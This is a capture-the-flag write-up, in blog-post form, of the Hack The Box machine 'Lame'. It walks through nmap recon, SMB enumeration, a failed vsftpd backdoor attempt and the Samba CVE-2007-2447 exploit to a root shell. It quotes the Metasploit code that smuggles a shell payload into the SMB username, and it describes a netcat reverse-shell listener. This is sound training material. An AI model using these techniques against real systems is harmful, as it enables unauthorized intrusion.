@@ -1,0 +1,128 @@
+---
+layout: /src/layouts/PostLayout.astro
+title: Lame
+tags: []
+---
+**Start 22:16 27/07** 
+
+---
+
+### Nmap recon
+First of all we start with an `nmap` scan `nmap -sC -sV -Pn 10.10.10.3
+
+![](../../../assets/7e26b6e16803fe97e118cefbbe9f71a6.png)
+
+Here we see a few open `ports` namely `21 / 22 / 139 / 445`.
+
+### 21/TCP - FTP 
+
+==Anonymous login==
+Since `21 - ftp` allows `Anonymous login` we should try that first. After trying `ftp 10.10.10.3` I found the directory to be empty.
+
+==Exploits==
+After looking up `vsftpd 2.3.4` using `searchsploit` we found some backdoor command execution exploits.
+
+![](../../../assets/52668cd18039b35ae664ec6dca5e9d45.png)
+
+### 445/TCP - Samba
+
+==smbmap==
+Using `smbmap -H 10.10.10.3` we can enumerate the SMB server.
+
+![](../../../assets/43f81db1f5d26d159af0ee375eeb747e.png)
+
+Since anonymous login is allowed we can connect to the `SMB` server using the following command: `smbclient -N //10.10.10.3/tmp` 
+Afterwards we run `ls` to list all the files in the current directory. We get the following:
+
+![](../../../assets/39eda28281cbf36a821db9b73eee317d.png)
+
+None of these files seem interesting to us.
+
+==Searchsploit==
+After looking up the version on `searchsploit` the following exploits pop up:
+
+![](../../../assets/76226021c0da9822f03e1d4ba648143b.png)
+
+From all these this one seems the most prevalent for us:
+
+```bash
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
+```
+
+This exploit is also known as `CVE 2007-2447` as found on `ExploitDB`.  Perhaps this will come of use to us later on.
+
+First let's try out the exploit we found for `port 21`.
+
+### VSFTPD Exploit
+
+To use this exploit we'll use `msfconsole` and use the path previously found using `searchsploit`.
+Using `search vsftpd` we found the path to the exploit which we can then `use`.
+
+![](../../../assets/dec5f39c476c29f33e714a0ba2247376.png)
+
+![](../../../assets/e940b4015bdc12115a7f2220b1615115.png)
+
+As always we type in `options` to find out what required settings we have to set up before firing up the exploit.
+
+![](../../../assets/461d58a3388d95b6cc2bb644f69395b6.png)
+
+We notice that we need to specify `rhosts` which would be `10.10.10.3` in this case, thus we just specify it using `set rhosts 10.10.10.3`.
+
+Since the payload has already been configured by default we can just `run` the exploit after configuring the `rhosts`.
+
+Unfortunately enough, the exploit completes but no session get's created. 
+
+![](../../../assets/be7fe461cdbb6cbf679a710aaeb069b2.png)
+
+This means that we'll have to try the `Samba` exploit we found earlier.
+
+### Samba Exploit
+
+For this we will have to utilize the [CVE 2007-2447](https://www.exploit-db.com/exploits/16320) as found previously in our `searchsploit`.
+Reading through this `CVE` we find the following part which is interesting for us:
+
+```rb
+def exploit
+
+		connect
+
+		# lol?
+		username = "/=`nohup " + payload.encoded + "`"
+		begin
+			simple.client.negotiate(false)
+			simple.client.session_setup_ntlmv1(username, rand_text(16),
+			datastore['SMBDomain'], false)
+		rescue ::Timeout::Error, XCEPT::LoginError
+			# nothing, it either worked or it didn't ;)
+		end
+
+		handler
+	end
+```
+
+In this part of the `CVE` we see that we need to use the defined `username` credentials to log in.
+In order for this to work we need to start a `nc -lvnp 443` listener. 
+When prompted for a password I just pressed `enter` and the connection succeeded.
+
+![](../../../assets/d1b253c54919172fe658b7ed575d61c6.png)
+
+![](../../../assets/e4237545d9ca8b0814e99a4e9887cf1a.png)
+
+We got a `root` shell this way, thus no need to escalate privileges :)
+
+### Flags
+
+As always we use `find` to quickly find the flags
+
+![](../../../assets/2f38fcef5784108d5b3f9e5bc4ff3eda.png)
+
+![](../../../assets/719208df0f5ffeb8e5f82fa6821654f4.png)
+
+![](../../../assets/619407244de02a4f565bd6cfdca6995e.png)
+
+---
+
+**Finished 23:32 27/07**
+
+
+[^Links]: [[Hack The Box]]
